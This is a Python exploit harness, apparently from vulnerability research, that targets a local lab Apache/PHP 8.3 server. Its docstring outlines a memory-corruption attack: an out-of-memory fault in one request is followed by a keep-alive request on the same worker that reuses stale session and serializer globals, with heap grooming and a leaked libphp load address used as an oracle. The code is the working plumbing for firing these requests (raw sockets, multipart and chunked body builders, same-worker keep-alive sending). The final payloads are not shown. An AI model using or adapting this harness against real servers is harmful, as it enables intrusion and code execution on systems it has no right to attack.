#!/usr/bin/env python3
"""
race-618 GLM fire harness.
Target: http://127.0.0.1:8083/lab/index.php (Apache 2.4.68 mod_php, php 8.3.35 pre-patch,
        dir memory_limit=2M via .htaccess; session.upload_progress on, freq=1%, min_freq=1s)

618 producer: OOM (fatal, in-band) via vendor-enumerated body-shape strategies.
619 consumer: next request ON THE SAME WORKER (keep-alive single connection =>
        same Apache prefork child) whose pre-RINIT startup parse (php_hash_environment)
        reuses worker-retained stale globals (BG(serialize)/BG(unserialize)/PS()/url-scanner)
        while its own multipart allocations groom the freed request heap.

bias (libphp.so load bias) from ?probe=all == worker identity oracle.
"""
import socket, sys, time, json, re

HOST, PORT = "127.0.0.1", 8083

def recv_resp(s, timeout=60, maxb=8 * 1024 * 1024):
    s.settimeout(timeout)
    buf = b""
    try:
        while len(buf) < maxb:
            d = s.recv(65536)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    return buf

def parse(resp):
    """split keep-alive response into (head, body, status, content_len, chunked)"""
    if not resp:
        return None
    i = resp.find(b"\r\n\r\n")
    if i < 0:
        return resp, b"", "?", -1, False
    head, body = resp[:i], resp[i + 4:]
    m = re.search(rb"HTTP/1\.[01] (\d+)", head)
    status = int(m.group(1)) if m else -1
    cl = re.search(rb"Content-Length: (\d+)", head, re.I)
    te = re.search(rb"Transfer-Encoding: chunked", head, re.I)
    return head, body, status, (int(cl.group(1)) if cl else -1), bool(te)

def req(head, body=None, timeout=60, fresh=True):
    """one connection, one request (or raw head+body bytes)"""
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.sendall(head if body is None else head + body)
    r = recv_resp(s, timeout)
    s.close()
    return r

def get_probe():
    r = req(b"GET /lab/index.php?probe=all HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
    head, body, status, cl, _ = parse(r)
    try:
        j = json.loads(body[:cl] if cl >= 0 else body)
        return status, j
    except Exception:
        return status, None

def part(name, body, filename=None, headers=None):
    h = b"--" + B + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\""
    if filename is not None:
        h += b"; filename=\"" + filename + b"\""
    h += b"\r\n"
    for k, v in (headers or []):
        h += k + b": " + v + b"\r\n"
    h += b"\r\n"
    return h + body + b"\r\n"

B = b"GLM618BOUNDARY"

def multipart(parts, boundary=None, content_length=None, chunked=False, extra_head=b""):
    body = b""
    for p in parts:
        body += p
    body += b"--" + B + b"--\r\n"
    head = b"POST /lab/index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
    head += b"Content-Type: multipart/form-data; boundary=" + B + b"\r\n"
    if chunked:
        # send body as one chunk + terminal
        payload = (hex(len(body))[2:].encode() + b"\r\n" + body + b"\r\n0\r\n\r\n")
        head += b"Transfer-Encoding: chunked\r\n" + extra_head + b"\r\n"
        return head, payload
    if content_length is None:
        content_length = len(body)
    head += b"Content-Length: " + str(content_length).encode() + b"\r\n" + extra_head + b"\r\n"
    return head, body

def fire_keepalive(requests, timeout=90):
    """send several requests over ONE keep-alive connection (same Apache child);
    returns list of raw responses parsed from the stream"""
    s = socket.create_connection((HOST, PORT), timeout=15)
    out = []
    for head, body in requests:
        s.sendall(head + body if body is not None else head)
        r = recv_resp(s, timeout)
        out.append(r)
        if not r:
            break
    s.close()
    return out

def bias_of(resp):
    h, b, st, cl, _ = parse(resp)
    try:
        j = json.loads(b[:cl] if cl >= 0 else b)
        return j.get("bias")
    except Exception:
        return None

def brief(resp, n=300):
    if resp is None:
        return "<no response>"
    h, b, st, cl, _ = parse(resp)
    if h is None:
        return repr(resp[:n])
    return f"status={st} body[:{n}]={b[:n]!r}"
